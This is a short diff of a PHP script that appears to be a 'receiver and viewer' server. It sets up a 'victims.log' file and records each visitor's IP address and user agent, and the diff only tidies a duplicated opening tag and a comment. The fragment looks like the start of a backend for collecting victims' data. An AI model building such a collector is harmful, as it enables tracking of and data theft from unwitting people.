@@ -1,9 +1,7 @@
 <?php
 header('Content-Type: text/html; charset=utf-8');
 mb_internal_encoding('UTF-8');
-// ... phần code còn lại
-<?php
-// server.php - Receiver + Viewer integrated
+
 $log_file = 'victims.log';
 $ip = $_SERVER['REMOTE_ADDR'];
 $user_agent = $_SERVER['HTTP_USER_AGENT'];
